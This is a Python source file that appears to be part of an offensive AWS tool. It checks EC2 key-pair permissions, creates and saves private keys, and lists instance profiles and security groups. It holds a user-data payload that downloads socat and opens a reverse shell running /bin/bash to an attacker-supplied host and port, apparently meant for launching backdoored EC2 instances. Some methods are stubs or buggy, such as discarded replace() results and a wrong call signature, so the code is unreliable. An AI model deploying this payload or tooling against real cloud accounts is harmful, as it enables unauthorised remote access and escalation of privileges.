from botocore.exceptions import ClientError
from os import mkdir

class Ec2():

    def __init__(self, session, console):
        self.ec2 = session.client("ec2")
        self.console = console
        self.user_data_payload = f"curl -o /tmp/socat https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" \
        " && /tmp/socat tcp4:<rhost>:<rport> exec:/bin/bash"
    
    def _create_key_pair(self, key_name: str):
        def _create(key_name: str, dry=True):
            try:
                if not dry:
                    self.console.log(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
                    key_pair = self.ec2.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
                    self.console.log("Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
                    mkdir("./keys")
                    with open(f"./keys/{key_name}.pem", "w") as priv_key:
                        self.console.log(f"Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
                        priv_key.write(key_pair["KeyMaterial"])
                else:
                    self.ec2.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
            except ClientError as e:
                if "DryRunOperation" in str(e):
                    return True
                else:
                    return False

        success = _create(key_name)
        if success:
            self.console.log("You have the required permissions to create a key pair ([green]SUCCESS[/green])")
            if y_n := self.console.input(
                "Would you like to create the key pair? ([blue]y[/blue]/[red]n[/red]): "
            ).strip().lower() == "y":
                _create(key_name, dry=False)
            else:
                self.console.print("Adios...")
                exit(1)
        else:
            self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")

    def _run_instance(
        self, key_name: str, instance_type: str):
        pass

    def launch_ec2_instance_profile(
        self, key_name: str, instance_profile_arn: str):
        self._create_key_pair(key_name)
        self._run_instance(key_name)

    def user_data_rev_shell(self, rhost: str, rport: int):
        self.user_data_payload.replace("<rhost>", rhost)
        self.user_data_payload.replace("<rport>", rport)

    def get_instance_profiles(self):
        instance_ids = []
        profiles = []
        for profile in self.ec2.describe_iam_instance_profile_associations()["IamInstanceProfileAssociations"]:
            instance_ids.append(profile["InstanceId"])
            profiles.append(profile["IamInstanceProfile"]["Arn"])
        return list(zip(instance_ids, profiles))
    
    def get_security_groups(self):
        for security_group in self.ec2.describe_security_groups()["SecurityGroups"]:
            for rule in security_group["IpPermissions"]:
                cidrs = []
                descriptions = []
                protocol = rule["IpProtocol"]
                if protocol == "-1":
                    continue
                for ip_range in rule["IpRanges"]:
                    cidrs.append(ip_range["CidrIp"])
                    descriptions.append(ip_range["Description"])
            if cidrs:
                self.console.print(f"[red underline]SecurityGroupName[/red underline]: {security_group['GroupName']}")
                self.console.print("Rules", style="#FFA500")
                self.console.print('\u2015'*5)
                self.console.print(
                    " "*3, f"\u2022 From {str(cidrs)}::{rule['FromPort']}",
                    "\u2192", f"::{rule['ToPort']}", f"([bold yellow]ALLOW[/bold yellow])\n"
                )
